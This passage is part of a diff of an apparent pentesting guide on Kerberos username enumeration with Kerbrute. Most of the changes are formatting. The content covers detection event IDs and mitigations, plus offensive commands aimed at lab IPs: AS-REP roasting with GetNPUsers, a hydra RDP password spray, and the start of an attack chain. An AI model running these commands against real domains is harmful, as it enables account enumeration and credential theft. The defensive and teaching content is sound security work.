 ### Event Log Analysis
 
 #### Windows Event IDs Generated
+
 ```bash
 # Event ID 4768 - Kerberos TGT Request (Username enumeration)
 # Event ID 4771 - Kerberos pre-authentication failed (Password attacks)
@@ -1332,6 +1450,7 @@ Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4768} | Select-Object T
 ### Defense and Detection
 
 #### Detection Methods
+
 ```bash
 # Monitor for rapid 4768 events from single IP
 # PowerShell detection script:
@@ -1341,14 +1460,16 @@ Get-WinEvent -LogName Security | Where-Object {
 ```
 
 #### Mitigation Strategies
-- **Account lockout policies** - But affects legitimate users
-- **Rate limiting** - Throttle authentication requests
-- **Network monitoring** - Detect unusual Kerberos traffic
-- **Honey accounts** - Fake accounts to detect enumeration
+
+* **Account lockout policies** - But affects legitimate users
+* **Rate limiting** - Throttle authentication requests
+* **Network monitoring** - Detect unusual Kerberos traffic
+* **Honey accounts** - Fake accounts to detect enumeration
 
 ### Alternative Tools
 
 #### If Kerbrute Doesn't Work
+
 ```bash
 # Impacket GetNPUsers (AS-REP Roasting)
 python3 GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
@@ -1364,6 +1485,7 @@ hydra -L users.txt -p Password123! rdp://10.10.10.10
 ### Troubleshooting
 
 #### Common Issues and Solutions
+
 ```bash
 # Issue: "connection refused"
 # Solution: Check DC IP and port 88
@@ -1388,6 +1510,7 @@ sudo ntpdate -s 10.10.10.10
 ### Integration with Other Tools
 
 #### Complete Attack Chain
+
 ```bash
 # 1. Username enumeration with Kerbrute
 ./kerbrute userenum -d domain.local users.txt --dc 10.10.10.10 -o valid_users.txt
